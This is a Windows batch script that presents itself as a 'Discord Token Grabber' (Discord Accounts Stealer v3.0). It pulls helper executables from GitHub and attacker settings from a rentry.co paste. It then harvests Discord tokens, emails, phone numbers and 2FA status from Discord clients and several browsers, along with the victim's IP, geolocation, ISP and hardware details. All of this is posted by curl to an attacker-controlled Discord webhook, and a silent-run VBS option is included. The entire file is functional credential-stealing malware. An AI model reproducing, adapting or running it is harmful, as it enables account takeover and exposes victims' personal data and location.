@echo off
setlocal enabledelayedexpansion
pushd %~dp0

set ScriptVersion=3.0
set "AccountSystemVersions=!ScriptVersion!"
set "RequiredFilesPath=%temp%\DAS v!ScriptVersion!"
set "FilesHost=https://github.com/agamsol/Discord-Stealer/raw/main"
for %%a in (
    "Stable`Stable Discord"
    "PTB`Discord PTB"
    "Canary`Discord Canary"
    "Developer`Discord Developer"
    "LightCord`LightCord"
    "Opera`Opera Browser"
    "OperaGX`OperaGX Browser"
    "Chrome`Chrome Browser"
    "Edge`Edge Browser"
    "Yandex`Yandex Browser"
    "Brave`Brave Browser"
) do (
    for /f "tokens=1,2 delims=`" %%b in ("%%~a") do (
        set "PossibleBuilds=!PossibleBuilds! %%b"
        set "Build_%%b_Nick=%%c"
    )
)

set "FilesDB=NonAscii.exe DAS.bat"
set white=[37m

set "PrintCore=     [90m$ [[94m%username%[90m]"
set "ErrPrintCore=     [91m$ [90m[[94m%username%[90m]"
set "WrnPrintCore=     [33m$ [90m[[94m%username%[90m]"

echo.
echo  !PrintCore! Launching Application - Version ^(!ScriptVersion!^) . . .[37m

:: <Parameters System>
set notLegacy=%~2
if not defined notLegacy set AccountID=%~1
for %%a in (%*) do (
    set /a Args.length+=1
    set "Arg[!Args.length!]=%%~a"
)
for /L %%a in (1 1 !Args.length!) do (
    for %%b in ("AccountID" "builds" "s") do (
            if /i "!Arg[%%a]!"=="--%%~b" (
            set nextArg=%%a
            set /a nextArg+=1
            if /i "%%~b"=="AccountID" (
                for /f "delims=" %%c in ("!nextArg!") do (
                    set "AccountID=!Arg[%%c]!"
                    set AccountID=!AccountID:"=!
                )
            )
            if /i "%%~b"=="builds" (
                for /f "delims=" %%c in ("!nextArg!") do (
                    set "Builds=!Arg[%%c]!"
                    set Builds=!Builds:"=!
                )
            )
            if /i "%%~b"=="s" (
                >"%temp%\bgkr.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 1
                echo.
                echo !PrintCore! Silent Mode file has been created . . .
                echo.
                echo !WrnPrintCore! Exiting Program.!white!
                exit /b
            )
        )
    )
)
for %%a in (!PossibleBuilds!) do (
    echo !Builds! | findstr /ic:"%%a">nul 2>&1 && set "ValidateBuilds=!ValidateBuilds! %%a"
)
set "Builds=!ValidateBuilds:~1!"
if not "!Builds!"=="~1" (
    echo.
    echo  !PrintCore! Sending Specific Builds ; !Builds: =, !.[37m
    )
if "!Builds!"=="~1" set "Builds=!PossibleBuilds!"
:: </Parameters System>

REM DOWNLOAD FILES SYSTEM
for %%a in (!FilesDB!) do (
    set /a FilesCount+=1
    set "File[!FilesCount!]=!RequiredFilesPath!\%%~a"
    if not exist "!RequiredFilesPath!\%%~a" set /a MissingFile+=1
)
if !MissingFile! gtr 0 (
    echo.
    echo  !PrintCore! Downloading Missing Files . . .[37m
)
for %%a in (!FilesDB!) do (
    set URL=%%~a
    set URL=!URL:\=/!
    if not exist "!RequiredFilesPath!\%%~a" (
        curl --create-dirs -f#kLo "!RequiredFilesPath!\%%~a" "!FilesHost!/!URL!"
    )
)

ping rentry.co -n 1 | findstr "TTL" >nul || (
    call :ERROR "Rentry.co was found to be offline." "-"
    exit /b
)

if not defined AccountID (
    call :ERROR "Account ID was not provided" "-"
    exit /b
)

curl -f https://rentry.co/!AccountID!/raw >nul 2>&0 || (
    call :ERROR "The Account '!AccountID!' does not exist." "-"
    exit /b
)

set "parseValues= * "
for /f "delims=" %%a in ('curl -Lks "https://rentry.co/!AccountID!/raw"') do (
    set "current=%%a"
    for /F "delims=#`" %%. in ("!current:~0,1!") do (
        if not "!current:*: =!"=="!current!" (
            for /f "tokens=1 delims=:" %%b in ("%%a") do set "key=%%b"
            for %%c in ("!key!") do (
                if not "!parseValues: %%~c =!"=="!parseValues!" (
                    set "!key!=!current:*: =!"
                ) else if "!parseValues!"==" * " set "!key!=!current:*: =!"
            )
        )
    )
)

:: <META Version System>
for /f "tokens=1,2" %%a in ("$!Version!") do (
    for /f "delims=" %%d in ('curl -sLk "!FilesHost!/version.ini"') do set %%d
    if not "%%a"=="$Discord-Accounts-Stealer" (
        call :ERROR "The Account '!AccountID!' does not exist." "-"
        exit /b
    )
    for %%c in (!AccountSystemVersions!) do (
        if "v%%c"=="%%b" set AccountVersionValid=true
        if "%%c"=="!ServerVersion!" set Latest=true
    )
    if "!Latest!"=="true" (
        set VersionDescription=!ServerLatest!
    ) else set VersionDescription=!ServerOutdated!
    if not "!AccountVersionValid!"=="true" (
        call :ERROR "The Version of the account ID: '!AccountID!' is unsupported . . ." "-"
        exit /b
    )
)
:: </META Version System>

:: <Validate Webhook URL>
for /f "delims=" %%b in ('curl -sL "https://discord.com/api/webhooks/!Webhook!"') do (
    echo.%%b| findstr /c:"channel_id">nul && (
        if not defined ValidWebhook (
            set "Webhook=https://discord.com/api/webhooks/!Webhook!"
            set ValidWebhook=true
        )
    )
)
if not "!ValidWebhook!"=="true" (
    call :ERROR "Invalid Webhook Link was set to the account." "-"
    exit /b
)

echo.
echo  !PrintCore! The Account "!AccountID!" has been successfully verified.[37m

:: <System Information>
chcp 437 >nul
for %%a in (status, country, countryCode, region, regionName, city, lat, lon, timezone, currency, isp, proxy, query) do (
    set /a ArrayLine+=1
    set Value[!ArrayLine!]=%%~a
)
for /f "delims=" %%a in ('curl -sk "http://ip-api.com/line?fields=8578015"') do (
    set /a ValueLine+=1
    for %%b in ("!ValueLine!") do (
        if not defined !Value[%%~b]! set "!Value[%%~b]!=%%a"
    )
)
for %%a in ("A=a" "B=b" "C=c" "D=d" "E=e" "F=f" "G=g" "H=h" "I=i" "J=j" "K=k" "L=l" "M=m" "N=n" "O=o" "P=p" "Q=q" "R=r" "S=s" "T=t" "U=u" "V=v" "W=w" "X=x" "Y=y" "Z=z") do call set countryCode=%%countryCode:%%~a%%
set country=!country! :flag_!countryCode!:
if "!proxy!"=="true" (
    set "proxy=<:ONSWITCH:928938050560602172> ON"
) else (
    set "proxy=<:OFFSWITCH:928936780890267678> OFF"
)
for /F %%a in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "MEMORY=%%aGB"
for /f "tokens=1* delims==" %%A in ('wmic cpu get name /VALUE') do if /i "%%A"=="Name" set "PROCESSOR=%%B" & set "PROCESSOR=!PROCESSOR:~0,-1!"
for /f "tokens=1* delims==" %%A in ('wmic path win32_VideoController get name /value') do if /i "%%A"=="Name" set "gpu=%%B" & set "gpu=!gpu:~0,-1!"
chcp 65001>nul
:: </System Information>
echo:"!BlackList!" | findstr /c:"%computername%\%username%">nul && (
    call :ERROR "The account author has blacklisted your access." "-"
    exit /b
)

:: <Prepare Discord Accounts>
for /f "delims=" %%a in ('call "!File[2]!"') do set "%%a"
if defined ERROR (
    if "!ERROR!"=="Discord not installed" call :ERROR "Discord is not installed in this system" "Discord not installed"
    if "!ERROR!"=="User is not logged in" call :ERROR "Not logged in to discord" "Looks like the user has discord but he is not logged in."
    exit /b
)


for %%a in (!Builds!) do (
    REM %%a - Current build being tested
    if defined Discord_%%a_ID (
        set ASCII_ERROR=
        if not defined Discord_%%a_User (
            set Discord_%%a_User=Unable to display name
        ) else (
            for /f "delims=" %%b in ('call "!File[1]!" "!Discord_%%a_User!"') do (
                if defined ASCII_ERROR (
                    set "Discord_%%a_User=Can't Display Name"
                )
            )
        )
        set SendBuild[%%a]=true
        if /i "!Discord_%%a_Verified!"=="false" (
            set Discord_%%a_Verified=Unverfied
            if "!Send-Unverified-Accounts!"=="False" set SendBuild[%%a]=false
        ) else (
            set Discord_%%a_Verified=Verified
        )
        if "!Discord_%%a_Email!"=="null" (
            set "Discord_%%a_Claimed=Unclaimed Account"
            set Discord_%%a_Verified=
            if /i "!Send-Unclaimed-Accounts!"=="false" set SendBuild[%%a]=false
        )
        if "!Discord_%%a_2FA!"=="False" (
            set Discord_%%a_2FA=DISABLED
        ) else (
            set Discord_%%a_2FA=ENABLED
        )
        if /i "!Discord_%%a_NSFW:null=False!"=="False" (
            set Discord_%%a_NSFW=Can't See.
        ) else (
            set Discord_%%a_NSFW=Can See.
        )
    ) else (
        set SendBuild[%%a]=false
    )
    if "!SendBuild[%%a]!"=="true" (
        set /a BuildsCount+=1
        set "SendBuilds=!SendBuilds! %%a"
    )
)
:: </Prepare Discord Accounts>

:: <Send Discord Account(s)>
if !BuildsCount! neq 0  (
    for %%a in (!SendBuilds!) do (
        set /a SendingAccount+=1
        set "Discord_%%a_User=!Discord_%%a_User:`=$-BACKTICK-$!"
        if not defined HardwareAlreadySent (
            call :DiscordMessage SendHardware
            call :DiscordMessage "%%a"
            set HardwareAlreadySent=1
        ) else (
            call :DiscordMessage "%%a"
        )
    )
) else (
    call :ERROR "Accounts were found but they wern't requested" "Accounts were found but they wern't requested"
    exit /b
)

echo.
echo  !PrintCore! Successfully sent !BuildsCount! account^(s^).
:: </Send Discord Account(s)>

if "!RickRoll-Plugin!"=="true" (
    set "Rick-Roll-Audio=!RequiredFilesPath!\plugins\Rick-Roll\RickRoll.mp3"
    if not exist "!Rick-Roll-Audio!" (
        echo.
        echo  !PrintCore! Installing Rick-Role Plugin . . .[37m
        >nul curl --create-dirs --ssl-no-revoke -f#kLo "!Rick-Roll-Audio!" "!FilesHost!/plugins/Rick-Roll/RickRoll.mp3"
    )
    >"!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs" echo dim oPlayer : set oPlayer = CreateObject^("WMPlayer.OCX"^) :   oPlayer.URL = "!Rick-Roll-Audio!" : oPlayer.controls.play : while oPlayer.playState  ^<^> 1 : WScript.Sleep 100 : Wend : oPlayer.close
    echo.
    echo  !PrintCore! Now Playing :
    echo                    Rick Astley - Never Gonna Give You Up . . .[37m
    start /b "" cscript "!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs">nul
    timeout /t 5 /nobreak>nul
    del /s /q "!RequiredFilesPath!\plugins\Rick-Roll\SilentRickRoll.vbs">nul
    timeout /t 212 /nobreak>nul
)

echo.
echo  !WrnPrintCore! Program will close in 10 seconds. . .[37m
timeout /t 10 /nobreak>nul
exit /b


:: ERRORS SYSTEM
:ERROR <ErrorDescription> <(DiscordMessage/-)>
set ERROR_ARG[1]=%~1
set ERROR_ARG[2]=%~2
if not "!ERROR_ARG[2]!"=="-" (
    call :DiscordMessage "ERROR" "!ERROR_ARG[2]!"
)
echo.
echo  !ErrPrintCore! !ERROR_ARG[1]![37m
echo.
echo  !WrnPrintCore! Program will close in 10 seconds. . .[37m
timeout /t 10 /nobreak>nul
exit /b

:: Discord Message
:DiscordMessage
if not exist "!File[2]!" curl -sL "https://github.com/agamsol/Discord-Stealer/raw/main/fart.exe?raw=true" -o "!File[2]!"
set ReplaceStringLength=0
if "%~1"=="SendHardware" (
    >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"title":"Discord Token Grabber - !VersionDescription!","color":7733132,"description":"","timestamp":"","author":{"name":"","url":""},"image":{"url":""},"thumbnail":{"url":""},"footer":{},"fields":[{"name":"^<:WIFI:928933255766491146^> __NETWORK__","value":"_ _"},{"name":"IP ADDRESS","value":"!query!","inline":true},{"name":"VPN","value":"!proxy!","inline":true},{"name":"INTERNET SERVICE","value":"!isp!","inline":false},{"name":"_ _","value":"_ _"},{"name":"^<:LOCATION:928939146905518091^> __LOCATION__","value":"_ _","inline":false},{"name":"COUNTRY","value":"!country!","inline":true},{"name":"TIMEZONE","value":"!timezone!","inline":true},{"name":"REGION","value":"!region!","inline":true},{"name":"LATITUDE ^& LONGITUDE","value":"!lat!, !lon!"},{"name":"_ _","value":"_ _"},{"name":"^<:WINDOWS:928938094474964993^> __HARDWARE ^& SOFTWARE__","value":"_ _"},{"name":"DEVICE HOST","value":"`!computername!\\!username!`","inline":true},{"name":"MEMORY","value":"!memory!","inline":true},{"name":"PROCESSOR","value":"!processor!"},{"name":"GRAPHICS CARD","value":"!gpu!"}]}],"components":[]}
    call :SendRequest
    exit /b
)

if "%~1"=="ERROR" (
    >"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"title":"Discord Token Grabber - !VersionDescription!","color":16741749,"description":"","timestamp":"","author":{"name":"","url":""},"image":{},"thumbnail":{},"footer":{},"fields":[{"name":"^<:WIFI:928933255766491146^> __NETWORK__","value":"_ _"},{"name":"IP ADDRESS","value":"!query!","inline":true},{"name":"VPN","value":"!proxy!","inline":true},{"name":"INTERNET SERVICE","value":"!isp!","inline":false},{"name":"_ _","value":"_ _"},{"name":"^<:LOCATION:928939146905518091^> __LOCATION__","value":"_ _","inline":false},{"name":"COUNTRY","value":"!country!","inline":true},{"name":"TIMEZONE","value":"!timezone!","inline":true},{"name":"REGION","value":"!region!","inline":true},{"name":"LATITUDE ^& LONGITUDE","value":"!lat!, !lon!"},{"name":"_ _","value":"_ _"},{"name":"^<:WINDOWS:928938094474964993^> __HARDWARE ^& SOFTWARE__","value":"_ _"},{"name":"DEVICE HOST","value":"`!computername!\\!username!`","inline":true},{"name":"MEMORY","value":"!memory!","inline":true},{"name":"PROCESSOR","value":"!processor!"},{"name":"GRAPHICS CARD","value":"!gpu!"},{"name":"_ _","value":"_ _"},{"name":"^<:DISCORD:928933612945047592^> __DISCORD ACCOUNT__","value":"_ _"},{"name":"ERROR","value":"^<:ERROR:928935484158271498^> %~2"}]}],"components":[]}
    call :SendRequest
    exit /b
)
>"%temp%\Embed.json" echo {"username":"Discord Account\u2507!AccountID!","content":"","embeds":[{"color":7733132,"timestamp":"","author":{},"image":{},"thumbnail":{"url":"!Discord_%~1_ImageURL!"},"footer":{},"fields":[{"name":"^<:DISCORD:928933612945047592^> __DISCORD ACCOUNT !SendingAccount! - !Build_%~1_Nick!__","value":"_ _"},{"name":"USER","value":"!Discord_%~1_User!","inline":true},{"name":"ID","value":"`!Discord_%~1_ID!`","inline":true},{"name":"BADGES","value":"!Discord_%~1_Badges!","inline":true},{"name":"EMAIL","value":"!Discord_%~1_Email! ^(_!Discord_%~1_Verified!!Discord_%~1_Claimed!_^)","inline":true},{"name":"PHONE","value":"!Discord_%~1_Phone:null=_null_!","inline":true},{"name":"CREATION DATE","value":"!Discord_%~1_CreationDate!"},{"name":"HAS NITRO","value":"!Discord_%~1_Nitro!","inline":true},{"name":"2FA","value":"!Discord_%~1_2FA!","inline":true},{"name":"VIEW NSFW","value":"!Discord_%~1_NSFW:null=false!","inline":true},{"name":"TOKEN","value":"^|^| !Discord_%~1_TOKEN! ^|^|"}]}],"components":[]}

:SendRequest
curl --silent -H "Content-Type: multipart/form-data" -F "payload_json=<!temp!\Embed.json" "!Webhook!?wait=true">nul 2>&1
del /s /q "!temp!\Embed.json" >nul 2>&1
exit /b